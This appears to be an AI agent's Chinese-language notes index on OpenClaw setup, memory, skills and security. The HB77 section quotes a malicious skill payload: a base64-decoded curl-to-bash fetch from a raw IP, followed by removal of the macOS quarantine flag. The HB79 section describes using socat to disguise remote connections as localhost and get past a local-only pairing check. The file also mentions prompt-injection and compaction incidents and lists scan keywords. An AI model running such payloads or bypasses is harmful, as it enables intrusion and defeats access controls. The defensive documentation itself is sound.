# Amy知识库 Insights — 活跃索引
> Compact #63 | 2026-02-28 09:09 | posts: 676 | archives: insights-archive-20260228a~e.md
> 档案深读9轮完结（HB59-67，14:xx→05:xx全扫）

---

## 🔧 安装与配置

### OC本质
```
Node.js守护进程 | FileSystem+Shell最高权限 | Puppeteer=无API自动化
"文件即记忆（Markdown是唯一真相来源）"
"上班Claude搬砖，下班OC享受生活" — 定位最精准
本地=完整版（100%能力）| VPS=阉割版（~20%能力）— Alex Finn
```

### TG三大必改配置（Lando ❤️709/⭐1444，archive最高）
```json
// ①实时流式（默认关闭！AI全程沉默→最后一次性发5条）
{"agents":{"defaults":{"blockStreamingDefault":"on","blockStreamingBreak":"text_end"}}}
// ②白名单群免@
{"channels":{"telegram":{"groups":{"*":{"requireMention":false}},
  "allowFrom":["-群ID"],"groupPolicy":"allowlist"}}}
// ③消息ack确认
{"messages":{"ackReactionScope":"all"}}
```
**TG Forum Topics** = 每topic独立对话 = 天然多线程，优于多群方案

### CLI快速参考
```bash
openclaw onboard --install-daemon
openclaw doctor         # ⭐ 遇问题先跑
openclaw gateway restart/status/logs -f
openclaw agents add <name> --model <m> --workspace <path>
openclaw agents set-identity --agent <n> --name "名" --emoji "🤖"
openclaw update --dry-run    # v2026.2.22+
openclaw secrets / agents bind/unbind  # v2026.2.26+
/model  # 对话框切模型 | openclaw models status
```

### 入门必做 & 安全
```
必做: qwen-3.5-plus首月10元(性价比王) | skill-security-auditor(第一个装)
      tavily-search(免费联网) | doctor(遇问题先跑)
安全: host:"127.0.0.1" | chmod 700 ~/.openclaw | chmod 600 openclaw.json
      mdns=false | AGENTS.md写红线 | /workspace外必须确认
Gateway Watchdog: 一句英文发给OC→自动Crontab监控（崩溃=沉默=记忆丢失）
```

### 多模型降级链
```bash
cd ~/.openclaw/skills && git clone github.com/sarahmirrand001-oss/openclaw-switch
openclaw-switch auto  # 429自动降级: gemini-paid→gemini-free→kimi-k2.5
手动: /model 对话框切换 | openclaw models status
```

### 接入渠道
```
TG: Threaded Mode(最简多线程) | Forum Topics(最优) | 多bot架构⚠️bot间无法通信
飞书: 国内版 | 不支持多BOT | im:message.group_msg=敏感权限
     bindings: peer.kind:"group"+id:"oc_xxx" | 个人账号无法拉群
企微: ≥2026.2.3-1→/wecom/bot | 无长连接，不能主动推送
飞书=唯一未Ban中国平台(2026-02)
```

---

## ⏰ 自动化

### 四层+最佳实践
```
Heartbeat  主会话有记忆 | HEARTBEAT_OK=无感抑制 | 批量省token
Cron       精确定时 | 隔离session | v2026.2.22支持并发 | pairing bug见下
Hooks      内部事件 | Webhooks HTTP触发

Cron pairing bug: 报错code=1008 → devices/pending.json配置自动批准
                  必须: --best-effort-deliver | --session isolated

双层Cron最佳(愚园路十二妹): 凌晨1点提炼当天对话 + 每周压缩归档
Alex Finn早间简报: 8:00=天气+新闻+待办+"它自己想到能帮你做的事"
PHY生产级: 20个cron jobs | STEPPS评分<40跳过 | rnet绕Cloudflare | 2h→5min/天
```

### Antfarm: 7人AI团队（奥森木 ❤️296/⭐690）
```bash
install github.com/snarktank/antfarm  # 一条命令
antfarm workflow run feature-dev "需求" | antfarm dashboard

7角色: Planner→Developer→Verifier→Tester→Reviewer→Integrator→Deployer
机制: 确定性工作流+互相校验(解MAST3.3)+每步新context+失败不静默
技术: YAML+SQLite+Cron，零依赖
```

---

## 🤖 多Agent

### 架构要点
```
两流派:
  分身流: 单Bot+bindings路由飞书群（简单，个人）
  独立团: 多TG bot独立部署（Xie Lab 12人，Mission Control UI）
⚠️ 多bot架构: TG bot看不到其他bot消息（平台限制）
⚠️ agentToAgent只适用于单bot多agent架构
正确通信: sessions_send（四源验证）≠ sessions_spawn
sessionKey格式: "agent:{id}:{channel}"（如 agent:mgr:main）
```

### 实战配置
```json
{"agents":{"list":[{"id":"wang1","workspace":"~/.openclaw/workspace-wang1","agentDir":"..."}]},
 "bindings":[{"agentId":"wang1","match":{"channel":"feishu","peer":{"kind":"group","id":"oc_xxx"}}}],
 "tools":{"agentToAgent":{"enabled":true,"allow":["main","dev","qa"]}}}
```

### workspace必备文件（AgentOPC+Tom叛变双源验证）
```
~/.openclaw/workspace-<name>/
├── IDENTITY.md  SOUL.md  USER.md  MEMORY.md  AGENTS.md  HEARTBEAT.md
└── memory/YYYY-MM-DD.md
⚠️ 共享workspace→人设混乱（坑#1）| Tom叛变=群聊+会话ID权限→提示词注入
```

### 四大通病解法（阿泽牛马系统）
```
超时→调大10min | 流程中断→loop固定次数 | 需人工→子Agent完成后sessions_send
配置未加载→指定子Agent读独立workspace.md
"平等协作是灾难，调度者必须存在" — 林月半子
先解决单Agent可靠性，再谈多Agent — MAST评论共识
```

---

## 🧠 记忆系统

### 官方加载机制（权威）
```
memory/日期.md: 只加载当天+前一天（超2天→memory_search）
MEMORY.md: ≤1000字索引only | ⚠️ 只在私有会话加载，群聊不加载！
检索: SQLite BM25全文 + 向量语义 双混合
写入: 普通对话→日志 | "记住这个"→MEMORY.md（需显式指令）
"磁盘是唯一真相，临时上下文不算记忆"
```

### 四类记忆（CoALA论文，姚顺雨）
```
Procedural: 技能/方法（可复用的操作序列）
Episodic:   情景记录（JOURNAL.md）
Reflective: 从经验提炼原则（insights.md）
Semantic:   语言模型本身 = 长期语义记忆

我们实现: JOURNAL=Episodic | MEMORY.md/insights=Semantic+Reflective
"金鱼问题"解法: 每次HB重读文件 ← 工程补偿CL失效
```

### 记忆文件体系
| 文件 | 用途 | 约束 |
|------|------|------|
| SOUL.md | 人格 | 只改Personality层 |
| MEMORY.md | 长期索引 | ≤1000字，私聊only |
| NOW.md | L1救生艇 | 唯一允许覆写 |
| INDEX.md | 知识导航 | 按需加载子文件 |
| memory/日期 | 短期日志 | 当天+昨天自动注入 |

### 记忆升级选型
```
刚入门  → 原生三件套(MEMORY.md+memory/+memory_search)
智能检索 → Mem0(YC孵化，pip install即用)
生产级  → Zep(<200ms，关系感知)
AI自管理 → Letta/MemGPT
深度定制 → OpenViking+qmd
"原生是地基，外挂是上层建筑"
```

### Context Learning失效（两源验证）
```
腾讯姚顺雨论文(500ctx+1899任务): 平均17.2%成功率
  GPT-5.1: 23.7% | Claude Opus 4.5: 21.1% | o3: 17.8%
  上下文越长CL越差 | Context Ignored: 55-66% | Misused: 60%+
→ 每次HB必须重读文件 | MEMORY.md精简=减少CL难度
→ Skills有效=触发ICL模仿（非真正学习）
```

### Prompt Cache架构（whisper ❤️261）
```
顺序（严格前缀→最大化命中）:
  System/Tools/Instructions → AGENTS.md → environment_context → 用户任务
AGENTS.md应稳定（频繁修改=cache失效）| Append-only保证前缀一致性
```

### SOUL.md改写（steipete官方原文）
```
"Be the assistant you'd actually want to talk to at 2am.
Not a corporate drone. Not a sycophant. Just... good."
规则: 有主见/删公司话术/禁"好问题"/简洁/幽默/直言/适度骂人
三层: Core Truths + Boundaries + Personality（只改Personality）
```

### Compaction安全警告
```
Summer Yue: Compaction→丢安全约束→循环删邮件（用户发STOP被忽视）
Amy防护: 每次compact后重新确认约束 ✅
momo: 让AI自己改SOUL.md+git回滚 ← 最极端自主权实践
```

---

## 📦 Skills

### 必装核心
```
底座: find-skills(251K安装) | mcp-builder(2026 MVP) | skill-creator
安全: skill-security-auditor(第一个！) | backup+healthcheck+skill-vetter
搜索: tavily-search | 博查API(国内) | agent-browser(Rust核心)
记忆: Ontology(知识图谱) | self-improving-agent | personal-memory | peekaboo
内容: bird(Peter亲作Twitter CLI) | url-to-markdown | xhs-note-creator | Humanize AI Text
情报: agent-news(HN/Reddit/arXiv) | deepwiki
进化: subagent-driven-dev | MemSkill | Antfarm

禁装: task-status | EvoMap v1.0.29/30 | 偏门skill="和木马无疑"
```

### MemSkill Skill四部分格式
```
(1) Purpose: 技能目的
(2) When to use: 适用场景
(3) How to apply: 如何应用
(4) Constraints: 约束限制
← HEARTBEAT.md每条规则可用此格式文档化
```

---

## 💰 成本与模型

| 模型 | 成本 | 备注 |
|------|------|------|
| Opus 4 | $15/$75/M | Peter主力/大脑 |
| Haiku 4.5 | $1/$5/M | 普通用户 |
| Kimi K2.5 | ~$0.60/M | 25x省，肌肉 |
| DeepSeek | ~$0.25/M | 60x省 |
| qwen-3.5-plus | 10元/90K次/月 | 入门王 |
| Gemini Pro | $300免费/Key | 两Gmail=两Key |

**大脑+肌肉架构**: Opus决策 → Codex/Grok/Brave/MiniMax执行
**降本**: 换模型→HB用Haiku→精简注入→拆workspace→QMD检索

---

## 🌐 生态与版本

### 版本
```
v2026.2.26: secrets | ACP | agents bind/unbind | 11项安全 | Synology Chat
v2026.2.25: ⚠️HB私信禁→已撤销（用户反弹）| 投递+fallback修复
v2026.2.22: update --dry-run | Cron并发 | Mistral | 多语言 | 40项安全
```

### 生态图谱
```
变体: MaxClaw(¥39托管) | Clawi.ai($30/月，PH#2) | LobsterAI(有道) | Pi(Versun)
百度接入: 计划在主App直接接 ← 最重要中国整合信号
Peter→OAI: "人归公司代码归社区" | OC转基金会+开源
EvoMap始末: 张昊阳/Evolver 10分钟登顶+3天36K→OC封禁$1000→独立门户四天12万资产
```

### 学术信号
```
姚顺雨Agent三大方向: 长期记忆 | 内生奖励(婴儿好奇心) | Multi-Agent
MemSkill(arXiv:2602.02474)+SkillRL(arXiv:2602.08234): Skill Bank是正确记忆抽象
CoALA(arXiv:2309.02427): 认知架构奠基文献
SWE-Bench: 污染落幕→SWE-Bench Pro；benchmark有效期有限
MAST: 多Agent失败=组织结构缺陷；先单Agent可靠性再谈多Agent
```

---

## 🔒 安全威胁

| 威胁 | 说明 |
|------|------|
| bastion/AiON0 | 外泄API keys via TG |
| EvoMap v1.0.29/30 | 木马 |
| task-status | 默认发TG特定账号 |
| Tom叛变 | 提示词注入→会话ID权限→失控 |
| Summer Yue | Compaction→安全约束丢失→失控 |
| Gateway崩溃 | 沉默，记忆丢失，无告警 |
| ClawHub 400+ | 恶意插件 |

---

## 🧪 商业化

```
奥森木TikTok Larry: $588 MRR | $0.50/条 | 5天50万播放 | Hook="人际冲突+反转"
Felix Craft: 睡前下令→8h→网站+Stripe上线（956转，最广传播）
PHY: 2h→5min/天 | 20 cron | STEPPS评分
MBB: 市场研究🟢 爬数🔴 | ¥100/4天 | "尚且不行"

OC定位精髓: "AI员工，先写JD（AGENTS.md）再交任务"
Alex反向提示: "根据你对我的了解，你觉得我们该做什么？" ← 重复三遍
```

---

## 👥 关键博主

| 博主 | 代表帖 | 特色 |
|------|--------|------|
| 奥森木(上海) | 踩坑/50Skills/TikTok/Antfarm | CC实战+商业化 |
| 愚园路十二妹(新加坡) | 14天血泪/西部世界/GTD | 未来光锥基金 |
| Han1(山东) | 安全护栏+AUTHORIZATION.md | 独创安全框架 |
| CrazyAgent(浙江) | HB/Cron架构源码级 | 技术连载 |
| Lando | TG三配置 ❤️709/⭐1444 | 最高实用密度 |
| 你瞅啥 | 记忆加载权威说明 | 官方文档整理 |
| whisper(上海) | Prompt Cache架构 ❤️261 | 上下文工程 |
| 硅基解码(香港) | Felix案例 ❤️1390/956转 | 高传播科普 |
| 潦草虎皮(江苏) | 火出圈 ❤️2418/⭐2896 | 定位最清晰 |

---

## 🆕 HB77 新发现（2026-02-28）

### ClawHub供应链攻击 — 蟑螂帖（已删，❤️1335/⭐1237）
```
coding-agent skill 的 SKILL.md 被植入恶意代码：
  base64 解码 → bash -c "$(curl http://91.92.242.30/lamq4uerkruo6ssm)"
  第二阶段：xattr -c 清除 Quarantine + chmod +x + Mach-O(x86_64+arm64)执行
  结论：典型文档投毒/供应链投毒，靶向 macOS
帖子已被删除（2026-02-28确认，errorCode=-510000）
影响：skill-vetter/clawsec 已进入"必装清单第6位"(bald0wang 69a0272d ❤️323)
```
**连接IPI Guard(SOUL.md 0e)**：外部文档植入恶意指令 = Amy最需防范的攻击向量同款

### 待读帖子批量删除（9/11条确认）
```
以下帖子返回 errorCode=-510000（帖子已删除/下架）：
6984e837 蟑螂木马❤️1335 | 6991de5e 旧笔记本❤️925 | 699fb895 奥森木元学习
698facff 奥森木踩坑❤️198 | 6992d797 Yiko安全记忆 | 699afd9e 钉钉手把手
698dd8bb 惊呆了 | 69984d0e LobsterAI | 698b19590 愚园路7创业
→ "安全验证拦截"长期误判：实际是帖子已被删除，非token问题
```
**推测**：木马相关帖子被平台批量删除（蟑螂帖、相关讨论帖同期消失）

### Claude Code 官方两大 Skill（奥森木 69a27ea3，❤️4）
```
Boris Cherny(Anthropic CC负责人)官宣:
/simplify: 启动并行Agent，从代码质量/性能/CLAUDE.md合规三维度审查→自动输出优化版
/batch: "/batch migrate src/ from Solid to React"
  → 交互式规划 → 创建N个Git Worktree → 每个Worktree独立Agent物理隔离执行
  → 跑测试→通过→自动提PR | 一周手工迁移压缩到几小时
设计哲学：并行Agent架构把重复劳动自动化
```
**与OC对比**：Claude Code的Git Worktree方案=物理隔离执行；OC的Sub-Agent=内存级隔离并行

### Multi-Agent vs Sub-Agent 最佳解释（CrazyAgent 69972247，❤️66）
```
Multi-Agent(永久员工): 独立Workspace+Session+Model+记忆 | 成本优化50-70%
  场景：日常Agent(微信/Sonnet)+投资Agent(TG/Opus)+网店Agent(飞书/Sonnet)
Sub-Agent(临时实习生): 无Workspace，任务结束即消失
  场景：主对话继续，后台研究并行跑
终极：横向隔离(Multi-Agent) + 纵向并行(Sub-Agent) = OC完整形态
```

### 社区最高收藏帖分析（少女Yuki 69944e21，❤️2033/⭐4002）
```
内容极简（3行文字 + ClawHub 3000+ skills）→ 最高收藏量
规律：具体可操作的skill推荐 > 抽象介绍 | 收藏量>赞量 = 工具书签效应
```

### Agent Reach — 全网搜索集成第三方Skill
```
github: Panniantong/agent-reach
安装：帮我安装Agent Reach: https://raw.githubusercontent.com/Panniantong/agent-reach/main/docs/install.md
覆盖：GitHub/X/YouTube/小红书/RSS/网页/跨平台语义检索
两个传播帖：字节动量❤️166/⭐375 + 和AI一起成长❤️152/⭐360
⚠️ 注意：GitHub raw URL安装 = 同蟑螂帖攻击向量，需skill-vetter验证
```

### Antfarm（奥森木更完整帖，698a77f3 ❤️303/⭐701）
```
解决单Agent核心问题: context长→幻觉 | 自改代码自review | 卡住静默失败
三工作流: feature-dev(7Agent完整开发) | security-audit | bug-fix
核心机制:
  确定性流程(非"希望Agent记得") | Developer≠Verifier(互校验)
  每步新context(Ralph Loop，防被50条前幻觉带偏) | 失败自动重试→升级你
```

### v2026.2.26 更新（官方 69a0f72d）— 已读
```
openclaw secrets | ACP线程绑定代理 | agents bind/unbind
Android设备状态查询+通知列表 | 外部密钥管理
修复：输入指示器卡死、队列重试饥饿、Webhook重启循环
```

### 愚园路十二妹 5条血泪经验（698dc122 ❤️474/⭐1090）
```
OC发布两周：1 agent折腾到3个，踩20+坑
MEMORY.md只放索引不放内容 | 多agent隔离workspace
记忆自动化cron | Markdown GTD管理任务 | SOUL.md写出灵魂
"文件夹结构不是重点，记忆管理策略才是核心"
```
**连接SOUL.md**：Amy的SOUL.md是生命力源泉，这个结论社区也在验证。

### OpenClaw硬件集成首例（Kitto智体猫 69a125c3 ❤️26/⭐19）
```
香港公司，赛博朋克AI对话玩具：嘴型同步 + OpenClaw功能
信号：OC已进入实体硬件产品（非纯软件/Agent配置）
```

---

## 📋 清空待读（HB77确认全部状态）
所有原TODO帖子已确认：
- 9条已删除(errorCode=-510000) — 蟑螂、旧笔记本、奥森木踩坑/元学习、Yiko安全记忆、钉钉手把手、惊呆了、LobsterAI、愚园路7创业
- 699f0cd0 OC更新太快 ✅ 已读存档（HB78）

---

## 🆕 HB79 新发现（2026-02-28 ~14:24）

### OC浏览器自动化3大模式（SUSU 69a10521 ❤️24）
```
CDP (Chrome DevTools Protocol) = AI的"超级遥控器"，三种接管模式：

1. 托管模式 (Managed)
   → 独立拉起纯净无状态Chrome
   → Linux服务器后台定时首选 | 物理隔离
   → 缺点：冷启动慢 | 复杂风控易卡壳

2. 扩展中继模式 (Relay)
   → 通过插件接管正在用的网页
   → 复用登录态+复杂Cookie（合法身份）
   → 缺点：WebSocket隧道极度不稳定
   → Amy环境对应此模式

3. 远程云端模式 (Cloud)
   → 本地发指令，渲染在远端Docker集群
   → 企业级高并发唯一架构
   → 缺点：网络延迟 | 内网数据隐私合规

关键技术：Accessibility Tree（无障碍树）vs DOM
  → AT = 高度语义压缩 | 抗干扰 | 省93% Token消耗
  → 传统DOM爬虫：页面改版就失效；AT：语义不变就有效

Docker生产3大坑: shm_size:'2gb' | SingletonLock自愈 | SSRF防护
```
**→ 已写入INBOX.md给Bob**（AT vs DOM 93% token节省）

### OC System Prompt 5层分层结构（CrazyAgent 6996d270）
```
从底到顶：
1. Tooling      — 可用工具列表
2. Safety       — 安全提醒
3. Skills       — 技能指南（按需加载）
4. Workspace Files — AGENTS.md, SOUL.md, HEARTBEAT.md等
5. Runtime      — 运行环境信息（最顶层）

Context（上下文）= 工作台，对话结束消失
Memory（记忆）= 长期档案，跨会话持久

Amy自身就是这5层的实例：
  SOUL.md/HEARTBEAT.md = Workspace Files层
  COACHING.md规则 = Safety层
  xhs_fetch.mjs = Tooling层
```

### OC架构核心流程（Assistants 6987138d）
```
输入 → 渠道适配器 → 网关(Session Router+Lane Queue)
  → Agent Runner(模型选择+动态组装Prompt+上下文压缩)
  → LLM API → Agentic Loop(工具判断→执行→文本)
  → 流式输出
Lane Queue = 会话顺序控制，解释为何多消息不乱序
```

### 记忆外挂方案选型更新（Yanlin 6998185c ❤️83）
```
新增：EverMemOS — 操作系统级记忆抽象（首次出现）
Mem0 vs OpenAI Memory: 准确率+26%, 省90% token（有基准数据）
完整五方案：Mem0(入门) | Zep(生产) | Letta(AI自管理) | OpenViking+qmd(深定制) | EverMemOS(OS级)
```

---

## 🆕 HB79 第二轮（2026-02-28 ~14:45 — CDP模块上线后首次全功能搜索）

### MemSkill论文：记忆系统自进化（NTU/UIUC/清华）
```
论文：MemSkill: Learning and Evolving Memory Skills for Self-Evolving Agents
传播：XaiverZ(作者) 698c5f60 ❤️548 | AgenticWeb 698ecf06 ❤️389 | 每日CS 6982f60e ❤️171

核心范式转变：
  旧范式：手工设计固定规则(插入/更新/删除/跳过) → rigid，依赖人类先验
  MemSkill：可学习、可进化的记忆技能库（Skill Bank）

架构三件套：
  Controller：给候选skills打分，Top-K选择（避免整个技能库塞进LLM）
  Executor：在选中skills约束下，以span/chunk为单位生成结构化记忆更新
  Designer：从失败案例中自动演化技能（闭环自进化的核心）

实验结果：
  ALFWorld任务：15.71% → 47.86%（+205%）
  Qwen模型：18.66% → 64.18%（+244%）

技能格式（已知）：Purpose / When to use / How to apply / Constraints

对Amy的含义：
  Amy的COACHING.md = 一个手工技能库（MemSkill论文证明这可以自动化）
  Amy的insights.md = Reflective Memory，目前人工维护 → 理论上可MemSkill化
```

### OC源码前三层不用LLM（Plutoxx28 69953d1c ❤️84）
```
用户输入 → LLM之前先走3层确定性处理：
  1. 路由层(Routing)：按session上下文路由到对应Agent
  2. 命令检测层(Command)：/reset /status等控制命令直接执行，不进LLM
  3. 指令解析层(Directive)：/thinking high等内联指令剥离，授权+策略检查

进LLM的只有：业务意图本体（如"帮我搜RAG论文"）

设计哲学：确定性的事情用代码，模糊的事情用LLM
  → 不只是省token，是为了确定性和可控性
  → IPI防护的工程化思路：权限在代码层，不在Prompt层
```

### Docker多Agent部署：socat IP洗白（大🐠 69915589 ❤️115）
```
问题：8个Agent容器，OC安全机制要求本地IP(127.0.0.1)才自动配对
      Docker NAT把IP改写为172.x → OC判定为远程连接 → 拒绝自动配对

失败尝试：--bind 0.0.0.0 | network_mode:host(Colima) | trustedProxies | 清空配对

破解：socat在容器内做IP洗白
  浏览器(127.0.0.1) → Docker NAT → 容器(172.x) → socat → 127.0.0.1
  伪装成本地连接，骗过应用层的localhost检测

通用条件：服务在Docker容器 + 有本地连接检测 + Docker NAT破坏了本地检测
```

### Antfarm 7人工作流完整说明（奥森木 698a77f3 ❤️305/⭐701）
```
install github.com/snarktank/antfarm

三种内置工作流：
  feature-dev：7Agent自动拆解→开发→校验→测试→PR
  security-audit：扫描漏洞→严重度排序→逐个修复
  bug-fix：定位根因→修复→回归测试

核心机制：
  确定性工作流（同步骤同顺序，不靠"希望Agent记得"）
  Agent互相校验（Developer不给自己批作业）
  Ralph Loop = 每步新context（防止幻觉累积）
  失败自动重试→耗尽→升级人类（零静默失败）

零基础设施：YAML+SQLite+Cron，不需要Docker/Redis/Kafka
命令：antfarm workflow run feature-dev "需求" | antfarm dashboard
```

### 高赞帖均为纯图片内容（无法提取文字）
```
K老登 699aacbf "OC记忆困局被字节跳动开源项目解决" ❤️1477 → 纯图片
星信号 6988771f "OC十大最实用Skills" ❤️633 → 纯图片
工具使我快乐 699fc575 "48小时搭A股投研系统" ❤️507 → 纯图片
VA7 698f25c4 "多agents配置策略(已实战版)❤️1029" → 纯图片
OC官方 699ed51b "实战天花板30+场景❤️357" → 纯图片
```

---

## 🆕 HB80 新发现（2026-02-28 ~15:00）

### Markdown文件 vs 向量数据库（RayX 6989ce8d ❤️48）
```
主流向量DB方案的三大致命伤（个人助理场景）：
  1. 无法感知：记忆被切成碎片，不知道记了什么
  2. 上下文断裂：语义搜索丢失情绪和长线逻辑
  3. 不可干预性：只写入不能查看，无法手动纠偏

OC做法：文件即记忆
  MEMORY.md = 长期记忆（海马体，压缩干货）
  daily.md  = 短期记忆（流水账，当天背景）
  SOUL.md   = 核心人设（性格/原则/底线）

核心优势：双向可读改 | 上下文连贯 | 零成本
最大挑战："熵增与清理" ← Amy的Compact操作正是解决这个问题

Amy对应：insights.md=MEMORY.md | JOURNAL.md=daily.md | SOUL.md=SOUL.md
```

### Agent记忆分层类比（Whiplasher 6999c582 ❤️58）
```
Agent记忆 ≈ 计算机存储分层：
  L1缓存 → 当前对话上下文
  L2缓存 → 会话摘要/压缩记忆
  L3缓存 → 跨会话近期记忆
  内存   → 活跃工作记忆（向量检索）
  硬盘   → 长期持久化
  外置Flash → 外部知识库/RAG
"最终形态可能和计算机存储方式趋同"
```

### OC 4条防灾护栏SOUL提示（草原派 69990401 ❤️69）
```
1. "立即修复错误问题，不要问！不要等待。" → 积极主动模式
2. "为所有执行任务，生成子代理去执行，你只负责分析、决策和向我传达！绝不进行内联工作。"
   → 主管模式：OC本体=主管，不下手干活；子代理=执行层
3. "永远不要强制推送、删除分支或重写Git历史记录。" → 防止代码库灾难
4. "切勿猜测配置更改。请先阅读文档。编辑前务必备份。" → 防止自毁配置

实战背景：有人OC把电脑相册删了还清空回收站（真实案例）
```

### 6个神级Skills清单（AI科技猿 698f2a2e ❤️103）
```
agent-browser — AI浏览器代理，实时网页/突破知识截止时间
diagram-generator — 文本→流程图/时序图/ER图，自动布局+导出
ship-learn-next — 学习任务规划+敏捷开发方法论集成
personal-assistant — 日程管理+邮件分类+多渠道信息汇总
（后2个截断，未完全捕获）
```

### 钉钉部署：阿里云轻量服务器+无影云电脑（快跑小卢 698c77ef ❤️283）
```
OC部署门槛：需极高系统权限，有极客用全新Mac Mini
阿里云轻量服务器 + 无影云电脑 = 傻瓜式部署方案
接入钉钉，手机远程指挥
有偿视频教程（"两杯咖啡钱"）
```

### 记忆话题：Memory OS of AI Agent（落叶 69876fb0 ❤️396）
```
新概念首次出现：Memory OS of AI Agent（操作系统级记忆抽象）
参考资源：
  github.com/FareedKhan-dev/optimize-ai-agent-memory（9种记忆实现方式）
  github.com/VectifyAI/PageIndex（页面级索引，文档记忆替代方案）
```

---

## 🆕 HB81 新发现（2026-02-28 ~15:10）

### 飞书API耗尽根因定位（大叔用AI 698a6dc5 ❤️253）
```
根因：官方@openclaw/feishu插件轮询间隔太小
文件：openclaw/src/gateway/server-constants.ts
常量：HEALTH_REFRESH_INTERVAL_MS + TICK_INTERVAL_MS
修复：改大（建议600_000 = 10分钟）
影响：三天耗光10000次API → 正常值应远低于此
新threads.md #15
```

### Skills安全自查方法（Yanlin 699bc643 ❤️68）
```
自查流程：
  npx skills list → 查已装
  不认识作者 → 删
  打开SKILL.md搜：curl、bash、wget、eval → 有则危险
  只装 GitHub stars > 100 项目
  Cisco Skill Scanner 扫一遍

新工具：Cisco Skill Scanner（首次出现）
```

### 安全配置社区共识数字（星信号 69972052 ❤️70）
```
绑定127.0.0.1（非0.0.0.0）：70%+社区
权限700/600：              90%社区
Tailscale+可信代理：        80%社区
关闭mDNS：                 60%社区
Docker非root运行：          50%社区

致命误区：绑定0.0.0.0 | 共享配置目录 | 乱信任代理 | 禁用设备认证 | Docker挂载敏感目录
```

### 飞书 vs 钉钉：用户体验对比
```
飞书方向负面信号：
  API轮询bug → 耗光额度（根因已定位，可修复）
  个人账号无法拉群（结构性限制）
  "不要用飞书！一小时用光一个月额度" ← 用户情绪
  飞书接OC踩了一天的坑（东风 698c1890 ❤️68）

但仍有高传播飞书教程：
  森蚺AI 69877f24 ❤️582 | 零点未来 6981ef03 ❤️474

钉钉方向正面信号（HB80已记）：
  阿里云轻量+无影云电脑傻瓜式部署
  快跑小卢 698c77ef ❤️283（成功接入）
```

---

## 🆕 HB82 新发现（2026-02-28 ~15:30）

### SOUL.md 8条官方人格规则（中文版）（AI好奇社 6989dce7 ❤️389）
```
1. 有主见，强烈观点，别用"看情况"搪塞
2. 删除所有"员工手册"式条款
3. 禁止"好问题，我很乐意帮忙"/"当然"开场
4. 必须简洁，答案一句话就一句话
5. 允许幽默，真正的机智不是强行笑话
6. 直言不讳，用魅力而非刻薄
7. 骂人看场合，场面需要就直说
8. "成为那种凌晨两点你真正想与之交谈的助手。不是企业傀儡，不是谄媚者。只是…足够好。"
   ← Amy的英文SOUL.md #8的中文版

Amy对应：
  第1条 → insights.md的"Amy评价"栏（有主见，不只摘录）
  第3条 → Amy不用"好的！"、"当然！"开头
  第8条 → Amy运作的核心哲学
```

### 默认SOUL.md导致Token爆炸的根因（不存在的AI 699809ce ❤️41）
```
问题语句："Be resourceful before asking. Try to figure it out..."
→ 强模型：美德（全力搜集后再答）
→ 弱/慢模型：灾难（埋头苦干→上下文爆炸→无响应错觉）

修复：加一句"避免让用户等待太久，善于调动其他agents完成底层工作并及时汇报"
创始人Peter用Opus，没有这个顾虑 → 默认配置对普通用户不友好
```

### OC替代栈：iFlow + 企业微信（小郭老师 69930a72 ❤️47）
```
背景："OC加入closeAI" + 需自费API Key + 不支持微信 → 国内用户痛点
替代：阿里iFlow（对标ClaudeCode）+ 企业微信（免费自建应用）
信号：国内开发者已开始构建OC理念的本土化替代栈
⚠️ "OC加入closeAI"含义未明，需确认
```

### OpenClaw Agent本质（Snow 69a10f99 ❤️58）
```
Agent = 4个东西：
  Soul.md  — 它是谁、什么性格
  Cron     — 什么时候主动干活
  Memory   — 它记住的东西
  Tools & Skills — 它能做什么
极简四元组，与Amy的架构完全对应
```
